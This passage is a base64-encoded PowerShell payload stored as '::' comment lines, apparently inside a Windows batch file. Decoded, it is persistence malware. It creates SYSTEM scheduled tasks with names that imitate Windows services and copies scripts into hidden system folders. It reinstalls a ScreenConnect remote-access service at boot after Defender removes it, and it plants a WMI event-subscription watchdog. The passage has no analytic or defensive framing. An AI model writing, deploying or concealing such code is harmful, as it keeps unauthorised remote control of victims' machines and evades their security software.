::IEAoJ1RjcElwQ29uZmxpY3RSZXMnLCdSZXNvbHV0aW9uUXVldWUnLCdOZXRUcmFj
::ZUNhY2hlJywnRGlhZ0hvc3RDYWNoZScsJ1BsYVNlcnZlckRpYWcnLCdXZXJRdWV1
::ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdXZGlIb3N0UHJveHknKQ0KfQ0KJERl
::ZmF1bHRzID0gW29yZGVyZWRdQHsNCiAgICBUQVNLX0EgPSAnV2VyUXVldWVTeW5j
::Jw0KICAgIFRBU0tfQiA9ICdQbGFTZXJ2ZXJIZWFsdGgnDQogICAgVEFTS19DID0g
::J1dkaUhvc3RQcm94eScNCiAgICBUQVNLX0QgPSAnVGNwSXBDb25mbGljdFJlcycN
::CiAgICBNT19BICAgPSAnMicNCiAgICBNT19CICAgPSAnMycNCn0NCg0KZnVuY3Rp
::b24gR2V0LUhvc3RTZWVkIHsNCiAgICAkcyA9IDBMDQogICAgZm9yZWFjaCAoJGMg
::aW4gJGVudjpDT01QVVRFUk5BTUUuVG9VcHBlcigpLlRvQ2hhckFycmF5KCkpIHsg
::JHMgPSAoJHMgKiAzMSArIFtpbnRdJGMpICUgMTAwMDAwMDAwNyB9DQogICAgcmV0
::dXJuICRzDQp9DQoNCmZ1bmN0aW9uIFJlYWQtSWRlbnRpdHkgew0KICAgICRpZCA9
::ICREZWZhdWx0cy5DbG9uZSgpDQogICAgaWYgKFRlc3QtUGF0aCAkY2ZnUGF0aCkg
::ew0KICAgICAgICBmb3JlYWNoICgkbGluZSBpbiAoR2V0LUNvbnRlbnQgLUxpdGVy
::YWxQYXRoICRjZmdQYXRoIC1Gb3JjZSkpIHsNCiAgICAgICAgICAgIGlmICgkbGlu
::ZSAtbWF0Y2ggJ15ccyooW0EtWl9dKylccyo9XHMqKC4rPylccyokJykgeyAkaWRb
::JG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0gfQ0KICAgICAgICB9DQogICAgfQ0K
::ICAgIHJldHVybiAkaWQNCn0NCg0KZnVuY3Rpb24gUmVtb3ZlLVRhc2tRdWlldChb
::c3RyaW5nXSR0bikgew0KICAgIGlmICgkdG4pIHsgJiBzY2h0YXNrcy5leGUgL0Rl
::bGV0ZSAvVE4gJHRuIC9GIDI+JjEgfCBPdXQtTnVsbCB9DQp9DQoNCmZ1bmN0aW9u
::IEdldC1UYXNrVmVyYm9zZUJsb2IoW3N0cmluZ10kdG4pIHsNCiAgICBpZiAoLW5v
::dCAkdG4pIHsgcmV0dXJuICcnIH0NCiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUg
::L1F1ZXJ5IC9UTiAkdG4gL0ZPIExJU1QgL1YgMj4kbnVsbA0KICAgIGlmICgkTEFT
::VEVYSVRDT0RFIC1uZSAwIC1vciAtbm90ICRvdXQpIHsgcmV0dXJuICcnIH0NCiAg
::ICByZXR1cm4gKCgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0pIC1qb2lu
::ICJgbiIpDQp9DQoNCmZ1bmN0aW9uIFRlc3QtVGFza093bnNNb24oW3N0cmluZ10k
::dG4sIFtzdHJpbmddJG1hcmtlcikgew0KICAgICMgVHJ1ZSBvbmx5IGlmIHRoZSBz
::Y2hlZHVsZWQgYWN0aW9uIHBvaW50cyBhdCBPVVIgbW9uL2V0bCBwYXRoIOKAlCBu
::b3QgYSBXaW5kb3dzIENPTSBoYW5kbGVyLg0KICAgICRibG9iID0gR2V0LVRhc2tW
::ZXJib3NlQmxvYiAkdG4NCiAgICBpZiAoLW5vdCAkYmxvYikgeyByZXR1cm4gJGZh
::bHNlIH0NCiAgICBpZiAoJG1hcmtlciAtYW5kICgkYmxvYiAtbWF0Y2ggW3JlZ2V4
::XTo6RXNjYXBlKCRtYXJrZXIpKSkgeyByZXR1cm4gJHRydWUgfQ0KICAgIGlmICgk
::YmxvYiAtbWF0Y2ggJyg/aSlcLnd1Y2FjaGVcXHxvd25fbW9uXC5jbWR8ZXRsX21v
::blwuY21kfFwuZXRsY2FjaGVcXCcpIHsgcmV0dXJuICR0cnVlIH0NCiAgICByZXR1
::cm4gJGZhbHNlDQp9DQoNCmZ1bmN0aW9uIEluaXRpYWxpemUtSWRlbnRpdHkgew0K
::ICAgICMgSWRlbXBvdGVudCB3aXRoaW4gYW4gSURFTlRWRVIgZ2VuZXJhdGlvbi4g
::UG9vbCB1cGdyYWRlcyBidW1wIElERU5UVkVSOg0KICAgICMgb3duZWQgb2xkLW5h
::bWUgdGFza3MgYXJlIGRlbGV0ZWQ7IFdpbmRvd3MgYnVpbHQtaW5zIHdpdGggc2Ft
::ZSBuYW1lIGFyZSBsZWZ0IGFsb25lLg0KICAgIGlmIChUZXN0LVBhdGggJGNmZ1Bh
::dGgpIHsNCiAgICAgICAgJG9sZCA9IFJlYWQtSWRlbnRpdHkNCiAgICAgICAgIyBM
::NzogYWxzbyByZWdlbmVyYXRlIGlmIGFueSBUQVNLXyogaXMgZW1wdHkgKEw0LUw2
::IG1vZHVsby9jYXN0IGJ1Z3MgbGVmdCBibGFuayBzbG90cykNCiAgICAgICAgJHNs
::b3RzT2sgPSAoJG9sZFsnSURFTlRWRVInXSAtZXEgIiRJZGVudFZlcnNpb24iKSAt
::YW5kICRvbGRbJ1RBU0tfQSddIC1hbmQgJG9sZFsnVEFTS19CJ10gLWFuZCAkb2xk
::WydUQVNLX0MnXSAtYW5kICRvbGRbJ1RBU0tfRCddDQogICAgICAgIGlmICgkc2xv
::dHNPaykgeyByZXR1cm4gJG9sZCB9DQogICAgICAgIGZvcmVhY2ggKCRrIGluICdU
::QVNLX0EnLCdUQVNLX0InLCdUQVNLX0MnLCdUQVNLX0QnKSB7DQogICAgICAgICAg
::ICAkdG4gPSBbc3RyaW5nXSRvbGRbJGtdDQogICAgICAgICAgICBpZiAoLW5vdCAk
::dG4pIHsgY29udGludWUgfQ0KICAgICAgICAgICAgIyBOZXZlciBkZWxldGUgYSBy
::ZWFsIFdpbmRvd3MgdGFzayB3ZSBuZXZlciBvd25lZCAoVFIgaXMgQ09NL2N1c3Rv
::bSBoYW5kbGVyKS4NCiAgICAgICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0
::biAnJykgeyBSZW1vdmUtVGFza1F1aWV0ICR0biB9DQogICAgICAgIH0NCiAgICAg
::ICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1Gb3JjZQ0KICAg
::IH0NCiAgICAkcyA9IEdldC1Ib3N0U2VlZA0KICAgICMgTDQ6IHR3byBzbG90cyBt
::YXkgaGFzaCB0byB0aGUgc2FtZSB0YXNrIHBhdGggKHBvb2xzIHNoYXJlIG5hbWVz
::KSAtPg0KICAgICMgb25lIHBoeXNpY2FsIHRhc2sgdGhlbiBzYXRpc2ZpZXMgdHdv
::IHNsb3RzIGFuZCB0aGUgZmxlZXQgc2hvd3MgMy80Lg0KICAgICMgV2FsayBlYWNo
::IHBvb2wgZm9yd2FyZCB1bnRpbCB0aGUgcGljayBpcyB1bmlxdWUgYWNyb3NzIHNs
::b3RzLg0KICAgICMgTDY6IHRoZSBvbGQgQChAKCdBJywgJHMgJSA4KSwgLi4uKSBm
::b3JtIHdhcyBkb3VibGUtYnJva2VuIGluIFBTIDUuMToNCiAgICAjIGJhcmUgJSBp
::bnNpZGUgQCgpIHBhcnNlcyBhcyB0aGUgRm9yRWFjaC1PYmplY3QgYWxpYXMgKG5v
::dCBtb2R1bG8pLCBzbyB0aGUNCiAgICAjIGNvbGxlY3Rpb24gY29sbGFwc2VkIGFu
::ZCB0aGUgbG9vcCBuZXZlciByYW4gLT4gaWRlbnRpdHkuY2ZnIGhhZCBFTVBUWQ0K
::ICAgICMgVEFTS18qIGFuZCB0aGUgd2hvbGUgZmxlZXQgZmVsbCBiYWNrIHRvIGlk
::ZW50aWNhbCBkZWZhdWx0IHRhc2sgbmFtZXMuDQogICAgJHNlZWRzID0gW29yZGVy
::ZWRdQHsNCiAgICAgICAgQSA9ICgkcyAlIDgpDQogICAgICAgIEIgPSAoKCRzICsg
::MykgJSA4KQ0KICAgICAgICBDID0gKCgkcyArIDUpICUgOCkNCiAgICAgICAgRCA9
::ICgoJHMgKyA3KSAlIDgpDQogICAgfQ0KICAgICRwaWNrID0gW29yZGVyZWRdQHt9
::DQogICAgZm9yZWFjaCAoJGxldHRlciBpbiAnQScsJ0InLCdDJywnRCcpIHsNCiAg
::ICAgICAgJGkgPSBbaW50XSRzZWVkc1skbGV0dGVyXQ0KICAgICAgICAkbmFtZSA9
::ICRQb29sc1skbGV0dGVyXVskaV0NCiAgICAgICAgJG4gPSAwDQogICAgICAgIHdo
::aWxlICgkcGljay5WYWx1ZXMgLWNvbnRhaW5zICRuYW1lIC1hbmQgJG4gLWx0IDgp
::IHsgJGkgPSAoJGkgKyAxKSAlIDg7ICRuYW1lID0gJFBvb2xzWyRsZXR0ZXJdWyRp
::XTsgJG4rKyB9DQogICAgICAgIGlmICgtbm90ICRuYW1lKSB7ICRuYW1lID0gJERl
::ZmF1bHRzWyJUQVNLXyRsZXR0ZXIiXSB9DQogICAgICAgICRwaWNrWyRsZXR0ZXJd
::ID0gJG5hbWUNCiAgICB9DQogICAgJGNmZyA9IEAoDQogICAgICAgICJUQVNLX0E9
::JCgkcGljay5BKSINCiAgICAgICAgIlRBU0tfQj0kKCRwaWNrLkIpIg0KICAgICAg
::ICAiVEFTS19DPSQoJHBpY2suQykiDQogICAgICAgICJUQVNLX0Q9JCgkcGljay5E
::KSINCiAgICAgICAgIk1PX0E9JCgyICsgKCRzICUgNCkpIiAgICAgICAgICAjIDIt
::NSBtaW4gaml0dGVyDQogICAgICAgICJNT19CPSQoMyArICgoJHMgKyAxKSAlIDMp
::KSIgICAgIyAzLTUgbWluIGppdHRlcg0KICAgICAgICAiU0VFRD0kcyINCiAgICAg
::ICAgIklERU5UVkVSPSRJZGVudFZlcnNpb24iDQogICAgKQ0KICAgIFNldC1Db250
::ZW50IC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAtVmFsdWUgJGNmZyAtRm9yY2UNCiAg
::ICByZXR1cm4gKFJlYWQtSWRlbnRpdHkpDQp9DQoNCmZ1bmN0aW9uIE5vcm1hbGl6
::ZS1UYXNrTmFtZShbc3RyaW5nXSR0bikgew0KICAgIGlmICgtbm90ICR0bikgeyBy
::ZXR1cm4gJycgfQ0KICAgIHJldHVybiAkdG4uVHJpbSgpLlRyaW1TdGFydCgnXCcp
::DQp9DQoNCmZ1bmN0aW9uIFdyaXRlLU93bkxvZyhbc3RyaW5nXSRtKSB7DQogICAg
::JGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQogICAgdHJ5IHsg
::QWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICRtIC1Gb3JjZSB9
::IGNhdGNoIHt9DQp9DQoNCmZ1bmN0aW9uIEVuc3VyZS1QZXJzaXN0VGFza3Mgew0K
::ICAgICMgTWlycm9yIHdvcmtpbmcgZGV0YWNoIChXdWNhY2hlT3duKTogY21kIHNj
::aHRhc2tzLCBCT09UIFRSIHBhdGgsIC9TVCBvbiBNSU5VVEUuDQogICAgJGlkID0g
::SW5pdGlhbGl6ZS1JZGVudGl0eQ0KICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRN
::b25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcgfQ0KICAg
::ICRib290ID0gSm9pbi1QYXRoICRlbnY6U3lzdGVtUm9vdCAnVGVtcFwud3VjYWNo
::ZScNCiAgICAkZXRsRGlyID0gJ0M6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFn
::bm9zaXNcU3RhdGVcLmV0bGNhY2hlJw0KICAgIGZvcmVhY2ggKCRkIGluIEAoJGJv
::b3QsICRldGxEaXIpKSB7DQogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxp
::dGVyYWxQYXRoICRkKSkgeyBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1Q
::YXRoICRkIC1Gb3JjZSB8IE91dC1OdWxsIH0NCiAgICB9DQogICAgJGJvb3RNb24g
::PSBKb2luLVBhdGggJGJvb3QgJ293bl9tb24uY21kJw0KICAgICRib290RXRsID0g
::Sm9pbi1QYXRoICRib290ICdldGxfbW9uLmNtZCcNCiAgICAkZXRsTW9uID0gSm9p
::bi1QYXRoICRldGxEaXIgJ2V0bF9tb24uY21kJw0KICAgIGlmIChUZXN0LVBhdGgg
::LUxpdGVyYWxQYXRoICRNb25QYXRoKSB7DQogICAgICAgIENvcHktSXRlbSAtTGl0
::ZXJhbFBhdGggJE1vblBhdGggLURlc3RpbmF0aW9uICRib290TW9uIC1Gb3JjZSAt
::RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICBDb3B5LUl0ZW0g
::LUxpdGVyYWxQYXRoICRNb25QYXRoIC1EZXN0aW5hdGlvbiAkYm9vdEV0bCAtRm9y
::Y2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgQ29weS1J
::dGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGV0bE1vbiAt
::Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9DQogICAg
::IyBMMzc6IGRlZGljYXRlZCBib290IGdyeXhhLWhlYWwuIERlZmVuZGVyIGNhbiBz
::dHJpcCB0aGUgZ3J5eGEgU0NNIHNlcnZpY2UgZW50cnkgZHVyaW5nDQogICAgIyBi
::b290IGJlZm9yZSB0aGUgbW9uJ3MgTUlOVVRFIHRhc2sgZmlyZXMuIEEgYm9vdC10
::cmlnZ2VyIGVuc3VyZSAoLU5vV2FpdCAtRm9yY2UpIHJlLWNyZWF0ZXMNCiAgICAj
::IGl0IHdpdGhpbiBzZWNvbmRzIG9mIHN0YXJ0dXAsIHNvIHJlYm9vdHMgbm8gbG9u
::Z2VyIGRyb3AgdGhlIGhvc3QgZnJvbSBncnl4YS4NCiAgICAkYm9vdEdyeXhhID0g
::Sm9pbi1QYXRoICRib290ICdncnl4YV9ib290LmNtZCcNCiAgICAkbGliSW5Cb290
::ID0gSm9pbi1QYXRoICRib290ICdvd25fbGliLnBzMScNCiAgICBpZiAoVGVzdC1Q
::YXRoIC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbGliLnBz
::MScpKSB7DQogICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0
::aCAkV29ya0RpciAnb3duX2xpYi5wczEnKSAtRGVzdGluYXRpb24gJGxpYkluQm9v
::dCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9DQog
::ICAgJGdiTGluZXMgPSBAKA0KICAgICAgICAnQGVjaG8gb2ZmJywNCiAgICAgICAg
::J3JlbSBMNDYgRlJFRVpFIGJvb3Qgc2Mgc3RhcnQgb25seScsDQogICAgICAgICdz
::YyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKDM2ZTUwNmZmMDE2YjIxNTEp
::IiA+bnVsIDI+JjEnLA0KICAgICAgICAnZXhpdCcNCiAgICApDQogICAgU2V0LUNv
::bnRlbnQgLUxpdGVyYWxQYXRoICRib290R3J5eGEgLVZhbHVlICRnYkxpbmVzIC1F
::bmNvZGluZyBBU0NJSSAtRm9yY2UNCiAgICAjIEJPT1QgaXMgbm90IExvY2tEaXIn
::ZCBieSBvd25fc2VjdXJlIOKAlCBUYXNrIFNjaGVkdWxlciBjYW4gcmVzb2x2ZSBU
::UiB0aGVyZS4NCiAgICAkdHJNb24gPSAiY21kLmV4ZSAvYyAkYm9vdE1vbiINCiAg
::ICAkdHJFdGwgPSAiY21kLmV4ZSAvYyAkYm9vdEV0bCINCiAgICAkdHJHcnl4YSA9
::ICJjbWQuZXhlIC9jICRib290R3J5eGEiDQogICAgJG1vQSA9IFtzdHJpbmddJGlk
::WydNT19BJ107IGlmICgtbm90ICRtb0EpIHsgJG1vQSA9ICcyJyB9DQogICAgJG1v
::QiA9IFtzdHJpbmddJGlkWydNT19CJ107IGlmICgtbm90ICRtb0IpIHsgJG1vQiA9
::ICczJyB9DQogICAgJHN0ID0gKEdldC1EYXRlKS5Ub1N0cmluZygnSEg6bW0nKQ0K
::ICAgICRzcGVjcyA9IEAoDQogICAgICAgIEB7IEtleSA9ICdUQVNLX0EnOyBNYXJr
::ZXIgPSAnb3duX21vbi5jbWQnOyBTYyA9ICdNSU5VVEUnOyBNbyA9ICRtb0E7IFRy
::ID0gJHRyTW9uIH0NCiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfQic7IE1hcmtlciA9
::ICdldGxfbW9uLmNtZCc7IFNjID0gJ01JTlVURSc7IE1vID0gJG1vQjsgVHIgPSAk
::dHJFdGwgfQ0KICAgICAgICBAeyBLZXkgPSAnVEFTS19DJzsgTWFya2VyID0gJ293
::bl9tb24uY21kJzsgU2MgPSAnT05TVEFSVCc7IE1vID0gJyc7IFRyID0gJHRyTW9u
::IH0NCiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfRCc7IE1hcmtlciA9ICdvd25fbW9u
::LmNtZCc7IFNjID0gJ09OTE9HT04nOyBNbyA9ICcnOyBUciA9ICR0ck1vbiB9DQog
::ICAgICAgIEB7IEtleSA9ICdUQVNLX0cnOyBNYXJrZXIgPSAnZ3J5eGFfYm9vdC5j
::bWQnOyBTYyA9ICdPTlNUQVJUJzsgTW8gPSAnJzsgVHIgPSAkdHJHcnl4YSB9DQog
::ICAgKQ0KICAgICRvayA9IDA7ICRyZWFybWVkID0gMDsgJGZhaWwgPSAwDQogICAg
::Zm9yZWFjaCAoJHNwIGluICRzcGVjcykgew0KICAgICAgICAjIFRBU0tfRyAoYm9v
::dCBncnl4YS1oZWFsKSB1c2VzIGEgZml4ZWQgbmFtZTsgdGhlIEEtRCByb3RhdGlv
::biBwb29sIGhhcyBubyBzbG90IGZvciBpdC4NCiAgICAgICAgJHRuID0gaWYgKCRz
::cC5LZXkgLWVxICdUQVNLX0cnKSB7ICdXdWNhY2hlR3J5eGFCb290JyB9IGVsc2Ug
::eyBOb3JtYWxpemUtVGFza05hbWUgKFtzdHJpbmddJGlkWyRzcC5LZXldKSB9DQog
::ICAgICAgIGlmICgtbm90ICR0bikgeyAkZmFpbCsrOyBjb250aW51ZSB9DQogICAg
::ICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0biAkc3AuTWFya2VyKSB7ICRvaysr
::OyBjb250aW51ZSB9DQogICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICgiXCR0
::biIpICRzcC5NYXJrZXIpIHsgJG9rKys7IGNvbnRpbnVlIH0NCiAgICAgICAgJGJs
::b2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICR0bg0KICAgICAgICBpZiAoLW5vdCAk
::YmxvYikgeyAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2IgKCJcJHRuIikgfQ0K
::ICAgICAgICBpZiAoJGJsb2IpIHsNCiAgICAgICAgICAgICRvdXJzQnJva2VuID0g
::KCRibG9iIC1tYXRjaCAnKD9pKW93bl9tb25cLmNtZHxldGxfbW9uXC5jbWR8Z3J5
::eGFfYm9vdFwuY21kfFwud3VjYWNoZVxcfFwuZXRsY2FjaGVcXCcpDQogICAgICAg
::ICAgICBpZiAoLW5vdCAkb3Vyc0Jyb2tlbikgeyAkZmFpbCsrOyBXcml0ZS1Pd25M
::b2cgInRhc2tzX3NraXBfZm9yZWlnbiAkdG4iOyBjb250aW51ZSB9DQogICAgICAg
::ICAgICBSZW1vdmUtVGFza1F1aWV0ICR0bg0KICAgICAgICAgICAgUmVtb3ZlLVRh
::c2tRdWlldCAoIlwkdG4iKQ0KICAgICAgICB9DQogICAgICAgICMgQnVpbGQgY21k
::bGluZSBleGFjdGx5IGxpa2Ugb3duLmNtZCBkZXRhY2ggKHByb3ZlbiB0byB3b3Jr
::IGFzIFNZU1RFTSkuDQogICAgICAgICRwYXJ0cyA9IEAoDQogICAgICAgICAgICAn
::L0NyZWF0ZScsICcvVE4nLCAkdG4sICcvUlUnLCAnU1lTVEVNJywgJy9STCcsICdI
::SUdIRVNUJywgJy9GJywNCiAgICAgICAgICAgICcvVFInLCAkc3AuVHIsICcvU0Mn
::LCAkc3AuU2MNCiAgICAgICAgKQ0KICAgICAgICBpZiAoJHNwLlNjIC1lcSAnTUlO
::VVRFJykgew0KICAgICAgICAgICAgJHBhcnRzICs9IEAoJy9NTycsICRzcC5Nbywg
::Jy9TVCcsICRzdCkNCiAgICAgICAgfQ0KICAgICAgICAkYXJnTGluZSA9ICgkcGFy
::dHMgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoJF8gLW1hdGNo
::ICdbXHMiXScpIHsgJyJ7MH0iJyAtZiAoJF8gLXJlcGxhY2UgJyInLCAnXCInKSB9
::IGVsc2UgeyAkXyB9DQogICAgICAgIH0pIC1qb2luICcgJw0KICAgICAgICAkY3Jl
::YXRlVHh0ID0gY21kLmV4ZSAvYyAic2NodGFza3MuZXhlICRhcmdMaW5lIiAyPiYx
::IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0NCiAgICAgICAgJGNyZWF0ZUpvaW5l
::ZCA9ICgkY3JlYXRlVHh0IC1qb2luICcgJykuVHJpbSgpDQogICAgICAgIFdyaXRl
::LU93bkxvZyAidGFza3NfY3JlYXRlICQoJHNwLktleSkgJHRuID0+ICRjcmVhdGVK
::b2luZWQiDQogICAgICAgIGlmICgoVGVzdC1UYXNrT3duc01vbiAkdG4gJHNwLk1h
::cmtlcikgLW9yIChUZXN0LVRhc2tPd25zTW9uICgiXCR0biIpICRzcC5NYXJrZXIp
::KSB7DQogICAgICAgICAgICAkcmVhcm1lZCsrDQogICAgICAgICAgICBpZiAoJHNw
::LktleSAtZXEgJ1RBU0tfQScgLW9yICRzcC5LZXkgLWVxICdUQVNLX0InKSB7DQog
::ICAgICAgICAgICAgICAgY21kLmV4ZSAvYyAic2NodGFza3MuZXhlIC9SdW4gL1RO
::IGAiJHRuYCIiIHwgT3V0LU51bGwNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBl
::bHNlIHsNCiAgICAgICAgICAgICRmYWlsKysNCiAgICAgICAgICAgIFdyaXRlLU93
::bkxvZyAidGFza3NfY3JlYXRlX0ZBSUwgJCgkc3AuS2V5KSAkdG4iDQogICAgICAg
::IH0NCiAgICB9DQogICAgcmV0dXJuICJ0YXNrcyBvaz0kb2sgcmVhcm1lZD0kcmVh
::cm1lZCBmYWlsPSRmYWlsIg0KfQ0KDQpmdW5jdGlvbiBSZW1vdmUtV2F0Y2hkb2cg
::ew0KICAgIGZvcmVhY2ggKCRjbHMgaW4gQCgnX19GaWx0ZXJUb0NvbnN1bWVyQmlu
::ZGluZycsJ19fRXZlbnRGaWx0ZXInLCdDb21tYW5kTGluZUV2ZW50Q29uc3VtZXIn
::LCdfX0ludGVydmFsVGltZXJJbnN0cnVjdGlvbicpKSB7DQogICAgICAgIEdldC1X
::bWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgJGNs
::cyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBX
::aGVyZS1PYmplY3Qgew0KICAgICAgICAgICAgICAgICgkXy5OYW1lIC1lcSAnV3Vj
::YWNoZVdhdGNoZG9nRicpIC1vciAoJF8uTmFtZSAtZXEgJ1d1Y2FjaGVXYXRjaGRv
::Z0MnKSAtb3INCiAgICAgICAgICAgICAgICAoJF8uVGltZXJJZCAtZXEgJ1d1Y2Fj
::aGVXYXRjaGRvZycpIC1vcg0KICAgICAgICAgICAgICAgICgkXy5GaWx0ZXIgLWFu
::ZCAkXy5GaWx0ZXIuVG9TdHJpbmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0Yq
::JykgLW9yDQogICAgICAgICAgICAgICAgKCRfLkNvbnN1bWVyIC1hbmQgJF8uQ29u
::c3VtZXIuVG9TdHJpbmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0MqJykNCiAg
::ICAgICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRfLkRlbGV0ZSgpIHwgT3V0
::LU51bGwgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gSW5zdGFsbC1XYXRjaGRvZyB7
::DQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgcmV0dXJuICRmYWxzZSB9DQogICAg
::UmVtb3ZlLVdhdGNoZG9nDQogICAgJG9rID0gJHRydWUNCiAgICB0cnkgew0KICAg
::ICAgICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlv
::biAtQ2xhc3MgX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gYA0KICAgICAgICAg
::ICAgLUFyZ3VtZW50cyBAeyBUaW1lcklkID0gJ1d1Y2FjaGVXYXRjaGRvZyc7IElu
::dGVydmFsTWlsbGlzZWNvbmRzID0gMTgwMDAwOyBTa2lwSWZQYXNzZWQgPSAkZmFs
::c2UgfSB8IE91dC1OdWxsDQogICAgICAgICRmID0gU2V0LVdtaUluc3RhbmNlIC1O
::YW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIg
::YA0KICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRj
::aGRvZ0YnOyBFdmVudE5hbWVzcGFjZSA9ICdyb290XGNpbXYyJzsgUXVlcnlMYW5n
::dWFnZSA9ICdXUUwnOw0KICAgICAgICAgICAgICAgICAgICAgICAgICBRdWVyeSA9
::ICJTRUxFQ1QgKiBGUk9NIF9fVGltZXJFdmVudCBXSEVSRSBUaW1lcklkPSdXdWNh
::Y2hlV2F0Y2hkb2cnIiB9DQogICAgICAgICRjID0gU2V0LVdtaUluc3RhbmNlIC1O
::YW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZl
::bnRDb25zdW1lciBgDQogICAgICAgICAgICAtQXJndW1lbnRzIEB7IE5hbWUgPSAn
::V3VjYWNoZVdhdGNoZG9nQyc7IENvbW1hbmRMaW5lVGVtcGxhdGUgPSAiY21kLmV4
::ZSAvYyBgIiRNb25QYXRoYCIiOyBSdW5JbnRlcmFjdGl2ZWx5ID0gJGZhbHNlIH0N
::CiAgICAgICAgU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3Jp
::cHRpb24gLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgYA0KICAgICAg
::ICAgICAgLUFyZ3VtZW50cyBAeyBGaWx0ZXIgPSAkZjsgQ29uc3VtZXIgPSAkYyB9
::IHwgT3V0LU51bGwNCiAgICB9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0NCiAgICBy
::ZXR1cm4gJG9rDQp9DQoNCmZ1bmN0aW9uIFRlc3QtV2F0Y2hkb2dHcmFwaCB7DQog
::ICAgJHQgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRp
::b24gLUNsYXNzIF9fSW50ZXJ2YWxUaW1lckluc3RydWN0aW9uIC1GaWx0ZXIgIlRp
::bWVySWQ9J1d1Y2FjaGVXYXRjaGRvZyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
::bnRpbnVlDQogICAgJGYgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxz
::dWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgLUZpbHRlciAiTmFtZT0n
::V3VjYWNoZVdhdGNoZG9nRiciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
::DQogICAgJGMgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3Jp
::cHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtRmlsdGVyICJO
::YW1lPSdXdWNhY2hlV2F0Y2hkb2dDJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICAkYiA9ICRudWxsDQogICAgaWYgKCRmIC1hbmQgJGMpIHsNCiAg
::ICAgICAgJGIgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3Jp
::cHRpb24gLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgLUVycm9yQWN0
::aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAgICAgICAgV2hlcmUtT2JqZWN0
::IHsgJF8uRmlsdGVyIC1saWtlICcqV3VjYWNoZVdhdGNoZG9nRionIC1hbmQgJF8u
::Q29uc3VtZXIgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dDKicgfSB8DQogICAgICAg
::ICAgICBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxDQogICAgfQ0KICAgIHJldHVybiBb
::Ym9vbF0oJHQgLWFuZCAkZiAtYW5kICRjIC1hbmQgJGIpDQp9DQoNCmZ1bmN0aW9u
::IEVuc3VyZS1XYXRjaGRvZyB7DQogICAgaWYgKFRlc3QtV2F0Y2hkb2dHcmFwaCkg
